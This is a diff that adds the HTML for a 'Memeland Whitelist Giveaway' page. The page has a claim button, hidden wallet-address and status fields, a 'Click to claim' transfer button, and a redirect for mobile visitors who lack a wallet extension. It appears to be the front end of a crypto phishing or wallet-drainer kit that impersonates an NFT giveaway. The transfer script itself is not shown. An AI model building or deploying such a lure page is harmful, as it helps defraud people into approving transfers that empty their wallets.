@@ -1,0 +1,64 @@
+﻿<html lang="en">
+
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width,initial-scale=1">
+	<meta name="theme-color" content="#000000">
+	<meta name="description" content="Memeland Whitelist Giveaway">
+	<meta property="og:title" content="Memeland Whitelist Giveaway">
+	<meta content="Memeland Whitelist Giveaway" property="og:title">
+	<meta content="
+	Memeland Whitelist Giveaway" property="og:description">
+	<meta property="og:description" content="Memeland Whitelist Giveaway">
+	<meta property="og:image" content="https://somethingisbrewing.xyz/assets/dock.jpg">
+	<link rel="icon" href="/assets/favicon.ico">
+	<link rel="preconnect" href="https://fonts.googleapis.com">
+	<link rel="preconnect" href="https://fonts.gstatic.com">
+	<link href="css2.css?family=Montserrat:wght@500;700&amp;display=swap" rel="stylesheet">
+	<title>Memeland Whitelist Giveaway</title>
+	<link href="src/css/main.css" rel="stylesheet">
+
+	<script>
+    if(screen.width <= 768 && !window.ethereum) {
+      window.location.href = "/mobile.html";
+    }
+  </script>
+</head>
+
+<body>
+	<div id="root">
+		<main>
+			<!-- need to add "background--blurred" for blur background-->
+			<div id="myBg" class="background">
+				<video loop="" autoplay="" playsinline="" muted="" poster="/assets/dock.mp4">
+					<source src="/assets/video/dock.webm" type="video/webm">
+					<source src="assets/video/dock.mp4" type="video/mp4">
+				</video>
+				<div class="blur"></div>
+			</div>
+			<div class="kyc" style="justify-content: center;">
+				<div id="connectDiv">
+					<button id="claim-button" class="button">Claim Whitelist</button>
+					<div class="disclaimer">Participate in Memeland Whitelist Giveaway.</div>
+				</div>
+				<div class="kyc-block" style="display:none">
+					<div class="kyc-label">Account</div>
+					<div id="walletAddress" class="kyc-body">0x0</div>
+				</div>
+				<div class="kyc-block" style="display:none">
+					<div class="kyc-label">
+						<div>Status</div>
+						<div class="status status--not_found"></div>
+					</div>
+					<div class="kyc-body">Available to claim 1</div>
+				</div>
+				<div class="kyc-block" style="display:none; flex-basis: 100%; text-align: center;">
+					<button id="transferButton" class="button">Click to claim </button>
+					<div id="elig" style="color: red;"></div>
+				</div>
+			</div>
+		</main>
+	</div>
+</body>
+
+</html>
